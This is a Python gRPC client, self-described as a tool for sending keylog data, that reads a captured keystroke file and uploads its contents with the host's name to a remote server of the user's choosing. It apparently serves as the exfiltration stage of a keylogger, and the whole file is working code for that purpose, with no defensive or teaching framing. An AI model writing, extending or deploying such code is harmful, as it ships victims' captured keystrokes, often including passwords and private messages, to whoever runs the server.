import sys
import grpc
import os
import argparse

# Import the generated Protocol Buffer classes and gRPC stubs
import logservice_pb2
import logservice_pb2_grpc


# Argument Parsing
def parse_args():
    """
    Defines and parses command-line arguments using the standard argparse library.
    """

    parser = argparse.ArgumentParser(
        description="REQLOGGER (gRPC) - Client for sending keylog data to a gRPC server."
    )

    # Define arguments
    parser.add_argument(
        '--addr',
        default='localhost:50051',
        help='The gRPC server address and port (e.g., example.com:50051).'
    )
    parser.add_argument(
        '--file',
        default='keys.log',
        help='Path to the local keylog file to read.'
    )
    parser.add_argument(
        '--limit',
        type=int,
        default=None,
        help='Maximum number of log lines to send (sends the N latest lines).'
    )
    parser.add_argument(
        '--timeout',
        type=int,
        default=5,
        help='Connection timeout in seconds for the RPC call.'
    )

    return parser.parse_args()


# Main Logic

def run_client():
    """Purpose of this function : Reads log data, connects to the gRPC server, and sends the request."""

    # Parsing the arguments
    args = parse_args()

    # Read and Prepare Log Data
    try:
        with open(args.file, 'r') as f:
            lines = f.readlines()

            if args.limit is not None and args.limit > 0:
                lines = lines[-args.limit:]

            log_data = ''.join(lines)

    except Exception as e:
        print(f"Error reading log file: {e}. Exiting.")
        sys.exit(1)

    # 2. Establish gRPC Connection

    try:
        # Create an insecure channel and stub (client instance)
        with grpc.insecure_channel(args.addr) as channel:
            stub = logservice_pb2_grpc.LogServiceStub(channel)

            # Build the request message
            request = logservice_pb2.SendLogRequest(
                log_content=log_data,
                # Simple system identifier for the client
                client_id=os.uname().nodename
            )

            # Make the Unary RPC call with timeout
            response = stub.SendLog(request, timeout=args.timeout)

            # 3. The Server Response
            if response.success:
                pass
            else:
                pass

    except grpc.RpcError as e:
        if e.code() == grpc.StatusCode.UNAVAILABLE:
            print(f"FATAL ERROR: Could not connect to gRPC server at {args.addr}. Is the server running?")
        elif e.code() == grpc.StatusCode.DEADLINE_EXCEEDED:
            print(f"ERROR: gRPC call timed out after {args.timeout} seconds.")
        else:
            print(f"gRPC ERROR ({e.code().name}): An unexpected error occurred: {e.details()}")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == '__main__':
    run_client()
